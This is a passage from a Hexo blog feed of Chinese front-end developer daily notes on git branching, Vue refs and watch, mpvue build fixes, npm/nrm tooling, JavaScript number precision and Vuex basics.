$feature</code></li><li>在修改工作目录的文件后提交修改：<code>git commit -a -m &quot;msg&quot;</code></li><li>切换回dev分支：<code>git checkout dev</code></li><li>下载服务器最新的dev数据，保证dev分支是最新的数据：<code>git pull origin dev</code></li><li>把feature的内容合并到dev，并且保留分支结构：<code>git merge $feature --no-ff</code></li><li>如果有，则处理conflicts(即进行第6,7步,保证数据是最新的)</li><li>处理完再提交一次：<code>git commit -a -m &quot;merge msg&quot;</code></li><li>此时可以删除这个分支：<code>git branch -d $feature</code></li><li>推送到服务器：<code>git push origin dev</code></li></ol><h2 id="Vue中watch的用法（具体可看4-6）"><a href="#Vue中watch的用法（具体可看4-6）" class="headerlink" title="Vue中watch的用法（具体可看4.6）"></a>Vue中watch的用法（具体可看4.6）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">watch:&#123;</span><br><span class="line">  <span class="comment">// 监听data中的oldvalue</span></span><br><span class="line">  oldvalue()&#123;</span><br><span class="line">    <span class="keyword">this</span>.newvalue = <span class="string">"change"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ref与refs"><a href="#ref与refs" class="headerlink" title="ref与refs"></a>ref与refs</h2><p><strong>Vue中的ref可以用来给元素或子组件注册引用信息，而$refs可以用来获取ref注册过的元素或组件</strong> </p><ol><li>当ref用在DOM节点上时，通过$refs获取的是该DOM元素节点。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p ref=&quot;test&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;button @click=&quot;fun&quot;&gt;&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">fun:function()&#123;</span><br><span class="line">console.log(this.$refs.test)  //输出&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>当ref用在组件上时，通过$refs获取的是该组件的实例，可进而调用组件内定义的方法、属性等</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;Home ref=&quot;test&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">console.log(this.$refs.test) //输出VueComponent</span><br></pre></td></tr></table></figure><ol start="3"><li>当有多处ref引用的值相同时</li></ol><ul><li><strong>当html中ref值相同的节点是兄弟节点时，通过$refs获取到的是文档中顺序靠下的节点（使用在DOM上和组件上原则一致，以DOM为例）</strong> </li><li><strong>当html中ref值相同的节点是嵌套关系时，比如父子关系，则通过$refs获取到的是外层节点（使用在DOM上和组件上原则一致，以DOM为例）</strong> </li><li><strong>当html中ref值相同的节点不在同一层级，也不是嵌套关系时，仍然遵循文档中顺序靠下的节点被获取的原则（使用在DOM上和组件上原则一致，以DOM为例）</strong> </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p ref=&quot;test&quot;&gt;456&lt;/p&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">  &lt;span ref=&quot;test&quot;&gt;123&lt;/span&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">console.log(this.$refs.test)   //&lt;span&gt;123&lt;/span&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>ref与v-for连用时，this.$refs[ref名称]获取到的是该DOM节点或组件的数组，需要加下标访问</strong> </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;Home v-for=&quot;num in loop&quot; :key=&quot;num&quot; ref=&quot;test&quot;&gt;&lt;/Home&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">console.log(this.$refs.test)</span><br><span class="line">//输出的是一个数组  (3)[VueComponent,VueComponent,VueComponent...]</span><br></pre></td></tr></table></figure><h2 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h2><p>debugger 语句用于停止执行 JavaScript，并调用 (如果可用) 调试函数。</p><p>使用 debugger 语句类似于在代码中设置断点。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.7.18</title>
      <link href="2020/07/18/%E6%97%A5%E5%B8%B8-2020.7.18/"/>
      <url>2020/07/18/%E6%97%A5%E5%B8%B8-2020.7.18/</url>
      
        <content type="html"><![CDATA[<h2 id="以太网身份验证失败，联网但是打不开网页"><a href="#以太网身份验证失败，联网但是打不开网页" class="headerlink" title="以太网身份验证失败，联网但是打不开网页"></a>以太网身份验证失败，联网但是打不开网页</h2><p>第一次拿自己的电脑用网线连接公司的网，需要验证身份。</p><ul><li>右键桌面右下角的网络，打开网络和Internet设置</li><li>选择以太网，更改适配器选项</li><li>右键以太网，选择属性，选择身份验证</li><li>输入公司给的账号密码进行验证</li></ul><p><strong>还有项目打不开的原因是由于Google浏览器为保证安全，会自动跳转https</strong></p><a id="more"></a><h2 id="mpvue项目在编译时的一个问题"><a href="#mpvue项目在编译时的一个问题" class="headerlink" title="mpvue项目在编译时的一个问题"></a>mpvue项目在编译时的一个问题</h2><p>微信语法需要提供的是 <code>wx:key=&quot;id&quot;</code> 这种形式，而mpvue/vue 的语法是 <code>wx:key=&quot;item.id&quot;</code> 的形式，mpvue 并没有处理这里的语法；</p><p> <strong>解决方案</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改 mpvue-template-compiler/build.js ，添加如下代码，使得在mpvue在编译时解决</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> temp = key.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="keyword">if</span> (temp.length === <span class="number">2</span>) &#123;</span><br><span class="line">            key = temp[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷leetcode时的几个知识点"><a href="#刷leetcode时的几个知识点" class="headerlink" title="刷leetcode时的几个知识点"></a>刷leetcode时的几个知识点</h2><ul><li>Number类型的范围是<code>-9007199254740991 (-(2^53-1))到9007199254740991(2^53-1)</code></li><li>字符串类型不能像数组一样直接赋值，例如str[i] = x是不可以的</li><li>x=123，String(x).split(“”) = [“1”,”2”,”3”]</li><li>arr = [“1”,”2”,”3”]，parseFloat(arr.join(“”)) = 123</li><li>Map结构，get方法查询键对应的值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">    [<span class="string">"a"</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="string">"b"</span>,<span class="number">2</span>],</span><br><span class="line">    [<span class="string">"c"</span>,<span class="number">3</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">map.get(<span class="string">"a"</span>) <span class="comment">//1</span></span><br></pre></td></tr></table></figure><ul><li>Map和Object区别</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 Object 中， key 必须是简单数据类型（整数，字符串或者是 symbol），而在 Map 中则可以是 JavaScript 支持的所有数据类型，也就是说可以用一个 Object 来当做一个Map元素的 key。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.7.17</title>
      <link href="2020/07/17/%E6%97%A5%E5%B8%B8-2020.7.17/"/>
      <url>2020/07/17/%E6%97%A5%E5%B8%B8-2020.7.17/</url>
      
        <content type="html"><![CDATA[<h2 id="怎么删除node-modules"><a href="#怎么删除node-modules" class="headerlink" title="怎么删除node_modules"></a>怎么删除node_modules</h2><p>先安装删除工具，然后使用删除命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install rimraf -g</span><br><span class="line">rimraf node_modules</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="node-sass是什么"><a href="#node-sass是什么" class="headerlink" title="node-sass是什么"></a>node-sass是什么</h2><p>Node-sass是一个库，它将Node.<a href="http://www.fly63.com/tag/js" target="_blank" rel="noopener">js</a>绑定到LibSass（流行样式表预处理器Sass的C版本）。它允许用户以令人难以置信的速度将.s<a href="http://www.fly63.com/tag/css" target="_blank" rel="noopener">css</a>文件本地编译为<a href="http://www.fly63.com/tag/css" target="_blank" rel="noopener">css</a>，并通过连接中间件自动编译。</p><h2 id="npm-run-dev-与-npm-run-dev-only"><a href="#npm-run-dev-与-npm-run-dev-only" class="headerlink" title="npm run dev 与 npm run dev:only"></a>npm run dev 与 npm run dev:only</h2><p>npm run dev是编译整个项目，而npm run dev:only是编译某个页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;dev:only&quot;: &quot;rimraf ./dist &amp;&amp; cross-env only=true node build/dev-server.js &quot;</span><br><span class="line">&quot;dev&quot;: &quot;node build/dev-server.js&quot;</span><br></pre></td></tr></table></figure><p>在dev-server.js中会进行判断only参数的值，来判断编译页面，其中<strong>cross-env</strong>是运行跨平台设置和使用环境变量(<a href="https://blog.csdn.net/Mweb_demo/article/details/100896756" target="_blank" rel="noopener">Node中的环境变量</a>)的脚本。</p><h2 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h2><p><code>map()</code>方法定义在JavaScript的<code>Array</code>中，它返回一个新的数组，数组中的元素为原始数组调用函数处理后的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> newArray = array.map(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> item * item;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(newArray)  <span class="comment">// [1, 4, 9, 16, 25]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.7.16</title>
      <link href="2020/07/16/%E6%97%A5%E5%B8%B8-2020.7.16/"/>
      <url>2020/07/16/%E6%97%A5%E5%B8%B8-2020.7.16/</url>
      
        <content type="html"><![CDATA[<h2 id="编译时的bug解决"><a href="#编译时的bug解决" class="headerlink" title="编译时的bug解决"></a>编译时的bug解决</h2><ol><li>cnpm install  版本不匹配</li><li>下载匹配版本 1.4.6</li><li>mpvue-loader版本 下载1.1.4</li><li>node-sass文件夹下缺少vender目录，新建 vender 文件夹.然后运行,npm rebuild node-sass –save-dev</li><li>修改 mpvue-template-compiler/build.js 4675行，converFor函数里添加如下代码</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> temp = key.split(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">if</span> (temp.length === <span class="number">2</span>) &#123;</span><br><span class="line">   key = temp[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>根本原因是install时根本没有按照package-lock.json中的版本去执行，只能手动安装相应版本</strong></p><a id="more"></a><h2 id="什么是nrm和npm"><a href="#什么是nrm和npm" class="headerlink" title="什么是nrm和npm"></a>什么是nrm和npm</h2><p>nrm 是一个 npm 源管理器，允许你快速地在 npm源间切换。</p><h3 id="nrm安装"><a href="#nrm安装" class="headerlink" title="nrm安装"></a>nrm安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm</span><br></pre></td></tr></table></figure><ul><li>查看可选源：<code>nrm ls</code></li><li>查看当前使用源：<code>nrm current</code></li><li>切换源：<code>nrm use taobao</code></li></ul><p>之后再使用npm安装命令就是使用的淘宝源</p><h2 id="符号标识版本号"><a href="#符号标识版本号" class="headerlink" title="^符号标识版本号"></a>^符号标识版本号</h2><table><thead><tr><th>^2.5.2</th><th>2.5.2 &lt;= version &lt; 3.0.0</th></tr></thead><tbody><tr><td>^0.2.3</td><td>0.2.3 &lt;= version &lt; 0.3.0</td></tr><tr><td>^0.0.3</td><td>0.0.3 &lt;= version &lt; 0.0.4</td></tr></tbody></table><p>首位不为0的加1</p><h2 id="package-json和package-lock-json"><a href="#package-json和package-lock-json" class="headerlink" title="package.json和package-lock.json"></a>package.json和package-lock.json</h2><p>npm描述模块信息的文件就是 package.json ，npm  install会根据package.json安装依赖</p><p>每次执行完npm install之后会对应生成package-lock文件，该文件记录了上一次安装的具体的版本号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原来的 package.json 文件只能锁定大版本，也就是版本号的第一位，并不能锁定后面的小版本，你每次npm install都是拉取的该大版本下的最新的版本，为了稳定性考虑我们几乎是不敢随意升级依赖包的，这将导致多出来很多工作量，测试/适配等，所以package-lock.json文件出来了，当你每次安装一个依赖的时候就锁定在你安装的这个版本。</span><br></pre></td></tr></table></figure><p>当文件中存在package-lock.json时，执行npm install，node从package.json文件读取模块名称，从package-lock.json文件中获取版本号，然后进行下载或者更新。 </p><h2 id="运行后台项目"><a href="#运行后台项目" class="headerlink" title="运行后台项目"></a>运行后台项目</h2><ol><li>npm run dev之后：<code>Your application is running here: http://10.2.98.163:2333</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个生成的ip地址在config/index.js中配置，为本机ip地址+2333端口号</span><br></pre></td></tr></table></figure><ol start="2"><li>更改本机host 用本地ip 指向 xxx.company-test.cn 通过 xxx.company-test.cn:端口号去访问</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//host文件</span><br><span class="line">10.2.98.163 xxx.company-test.cn</span><br><span class="line"></span><br><span class="line">//访问地址：http://xxx.company-test.cn:2333/</span><br></pre></td></tr></table></figure><p>为什么要改为xxx.company-test.cn？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为cooike的同源策略，二级域名相同算作同源，这样可以保证用户的登录状态。</span><br><span class="line"></span><br><span class="line">我已经在company-test.cn上成功登录了，就已经存在了cooike，此时再用xxx.company-test.cn访问就可以获取登录态</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.7.14</title>
      <link href="2020/07/14/%E6%97%A5%E5%B8%B8-2020.7.14/"/>
      <url>2020/07/14/%E6%97%A5%E5%B8%B8-2020.7.14/</url>
      
        <content type="html"><![CDATA[<h2 id="入职准备"><a href="#入职准备" class="headerlink" title="入职准备"></a>入职准备</h2><ul><li>下载微信开发者工具</li><li>下载vscode和vue语法识别</li><li>安装node</li><li>安装vue和mpvue</li></ul><a id="more"></a><h2 id="下载微信开发者工具"><a href="#下载微信开发者工具" class="headerlink" title="下载微信开发者工具"></a>下载微信开发者工具</h2><p>地址：<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html</a> </p><h2 id="下载vscode和插件"><a href="#下载vscode和插件" class="headerlink" title="下载vscode和插件"></a>下载vscode和插件</h2><p>地址：<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">https://code.visualstudio.com/</a> </p><p>转换为中文：</p><ul><li>按Ctrl + Shift + P打开命令调色板，然后开始键入“display”以过滤并显示Configure Display Language命令。 </li><li>选择并按下Enter键，会打开一个locale.json文件，将文件中的配置项修改为<code>&quot;locale&quot;:&quot;zh-cn&quot;</code></li><li>选择扩展选项，输入@category:”language packs” ，安装中文包</li></ul><p>安装插件：</p><ul><li>ESLint</li><li>Live Server</li><li>minapp</li><li>open-in-browser</li><li>Vetur</li><li>vscode-icons</li><li>wechat-snippet</li><li>wxml</li></ul><h2 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h2><p>地址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a></p><p>node安装完成后  node -v和npm -v</p><p>安装cnpm：npm install -g cnpm –registry=<a href="http://registry.npm.taobao.org" target="_blank" rel="noopener">http://registry.npm.taobao.org</a> </p><h2 id="安装vue和mpvue"><a href="#安装vue和mpvue" class="headerlink" title="安装vue和mpvue"></a>安装vue和mpvue</h2><p>安装vue :  cnpm install –global vue-cli </p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>js的数值范围</title>
      <link href="2020/07/11/%E6%95%B4%E7%90%86-js%E7%9A%84%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4/"/>
      <url>2020/07/11/%E6%95%B4%E7%90%86-js%E7%9A%84%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="js的数值范围以及为什么"><a href="#js的数值范围以及为什么" class="headerlink" title="js的数值范围以及为什么"></a>js的数值范围以及为什么</h2><blockquote><p>JavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。 </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+<span class="string">"6145390195186705543"</span>    <span class="comment">// 出现精度问题，6145390195186705000</span></span><br><span class="line">BigInt(<span class="string">"6145390195186705543"</span> )+<span class="number">1</span>n  <span class="comment">//6145390195186705544n</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以，<code>1</code>与<code>1.0</code>是相同的，是同一个数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 === 1.0 // true</span><br></pre></td></tr></table></figure><p>由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span></span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0.1 =&gt; 0.0001 1001 1001 1001…（无限循环）</span></span><br><span class="line"><span class="comment">//0.2 =&gt; 0.0011 0011 0011 0011…（无限循环）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//双精度浮点数的小数部分最多支持 52 位，所以两者相加之后得到这么一串 0.0100110011001100110011001100110011001100110011001100因浮点数小数位的限制而截断的二进制数字，这时候，我们再把它转换为十进制，就成了0.30000000000000004。</span></span><br><span class="line"></span><br><span class="line"><span class="number">0.3</span> / <span class="number">0.1</span></span><br><span class="line"><span class="comment">// 2.999999999999999</span></span><br><span class="line"></span><br><span class="line">(<span class="number">0.3</span> - <span class="number">0.2</span>) === (<span class="number">0.2</span> - <span class="number">0.1</span>)</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="数值精度"><a href="#数值精度" class="headerlink" title="数值精度"></a>数值精度</h3><p>根据国际标准 IEEE 754，JavaScript 浮点数的64个二进制位，从最左边开始，是这样组成的。</p><ul><li>第1位：符号位，<code>0</code>表示正数，<code>1</code>表示负数      （1位）</li><li>第2位到第12位：指数部分                                 （11位）</li><li>第13位到第64位：尾数部分                               （52位）</li></ul><p>符号位决定了一个数的正负，指数部分决定了数值的大小，小数部分决定了数值的精度。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IEEE 754 规定，有效数字第一位默认总是1，不保存在64位浮点数之中。也就是说，有效数字总是1.xx...xx的形式，其中xx..xx的部分保存在64位浮点数之中，最长可能为52位。因此，JavaScript 提供的有效数字最长为53个二进制位。</span><br><span class="line"></span><br><span class="line">(-1)^符号位 * 1.xx...xx * 2^指数位</span><br><span class="line"></span><br><span class="line">精度最多只能到53个二进制位(有一位不在浮点数中)，这意味着，绝对值小于2的53次方的整数，即-(2^53-1)到2^53-1，都可以精确表示。</span><br><span class="line"></span><br><span class="line">2^0+2^1+...+2^52 = 2^53-1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git原理</title>
      <link href="2020/07/09/%E6%95%B4%E7%90%86-git%E5%8E%9F%E7%90%86/"/>
      <url>2020/07/09/%E6%95%B4%E7%90%86-git%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li>git常见命令：<a href="https://blog.csdn.net/web_csdn_share/article/details/79243308" target="_blank" rel="noopener">https://blog.csdn.net/web_csdn_share/article/details/79243308</a> </li><li>git reset原理：<a href="https://www.cnblogs.com/wangwenjin2026/p/11549285.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangwenjin2026/p/11549285.html</a> </li><li>commit规范</li><li>什么是fork：<a href="https://www.liaoxuefeng.com/wiki/896043488029600/900937935629664" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600/900937935629664</a></li></ul><a id="more"></a><h2 id="commit-规范"><a href="#commit-规范" class="headerlink" title="commit 规范"></a>commit 规范</h2><ul><li>feat: 新功能(feature)</li><li>fix: 修复 bug</li><li>docs: 文档(documents)</li><li>style: 代码格式(不影响代码运行的格式变动，注意不是指 CSS 的修改)</li><li>refactor: 重构(既不是新增功能，也不是修改 bug 的代码变动)</li><li>test: 提交测试代码(单元测试，集成测试等)</li><li>chore: 构建或辅助工具的变动</li><li>misc: 一些未归类或不知道将它归类到什么方面的提交</li></ul><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><p>参考：<a href="https://www.liaoxuefeng.com/wiki/896043488029600/900937935629664" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600/900937935629664</a></p>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.6.23</title>
      <link href="2020/06/23/%E6%97%A5%E5%B8%B8-2020.6.23/"/>
      <url>2020/06/23/%E6%97%A5%E5%B8%B8-2020.6.23/</url>
      
        <content type="html"><![CDATA[<ul><li>input标签的maxlength属性和autocomplete属性</li><li>动态绑定class改变样式</li><li>动态绑定图片 require</li><li>什么是vuex</li><li>调用接口</li><li>每日一题</li><li>github打不开怎么办</li></ul><a id="more"></a><h2 id="input标签的maxlength属性和autocomplete属性"><a href="#input标签的maxlength属性和autocomplete属性" class="headerlink" title="input标签的maxlength属性和autocomplete属性"></a>input标签的maxlength属性和autocomplete属性</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- maxlength 属性规定输入字段的最大长度--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">maxlength</span>=<span class="string">"value"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- autocomplete 属性规定输入字段是否应该启用自动完成功能。自动完成允许浏览器预测对字段的输入。当用户在字段开始键入时，浏览器基于之前键入过的值，应该显示出在字段中填写的选项。 开启为默认--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autocomplete</span>=<span class="string">"on/off"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="动态绑定class改变样式"><a href="#动态绑定class改变样式" class="headerlink" title="动态绑定class改变样式"></a>动态绑定class改变样式</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"auto-login-icon"</span> <span class="attr">:class</span>=<span class="string">"&#123;active: isAutoLogin&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--根据isAutoLogin的值为true或者false改变class的值--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"auto-login-icon active"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"auto-login-icon"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="动态绑定图片-require"><a href="#动态绑定图片-require" class="headerlink" title="动态绑定图片 require"></a>动态绑定图片 require</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"bg"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            bg: require('地址')</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="comment">&lt;!--不加require不能正常显示--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="什么是vuex"><a href="#什么是vuex" class="headerlink" title="什么是vuex"></a>什么是vuex</h2><blockquote><p>所谓的Vuex其实就是一个为Vue.js设计的数据仓库，就是把各个组件公用的数据放到一个仓库里面进行统一的管理，这样既使得非父子组件间的数据共享变得简单明了，也让程序变得更加可维护（将数据抽离了出来）,而且只要仓库里面的数据发生了变化，在其他组件里面数据被引用的地方也会自动更新。</p></blockquote><p>在store文件夹中的index.js写到：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(Vuex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    state: &#123;                         <span class="comment">//存储数据</span></span><br><span class="line">        loading: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;                     <span class="comment">//存储操作数据的方法</span></span><br><span class="line">        lock(state) &#123;</span><br><span class="line">            state.loading = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    modules: &#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> 